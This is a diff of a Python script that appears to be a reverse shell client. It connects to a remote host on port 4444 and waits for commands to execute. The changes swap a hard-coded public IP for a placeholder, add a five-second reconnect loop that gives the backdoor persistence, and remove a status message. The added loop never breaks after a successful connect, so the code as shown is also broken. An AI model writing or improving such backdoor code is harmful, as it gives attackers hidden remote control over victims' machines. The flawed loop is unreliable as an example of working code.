@@ -1,19 +1,24 @@
 import socket
 import subprocess
 import os
+import time
 
 # Configuration for connecting to the server
-host = "18.217.147.188"  # replace with your server IP
+host = "0.0.0.0"  # replace with your server IP
 port = 4444  # ensure this matches the server's port
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((host, port))
+while True:
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((host, port))
+    except Exception as e:
+        time.sleep(5)
+        continue
 
 try:
     while True:
         command = client_socket.recv(1024).decode("utf-8")
         if command.lower() == "exit":
-            print("Closing connection.")
             break
         
         # Handle 'cd' command separately for directory changes
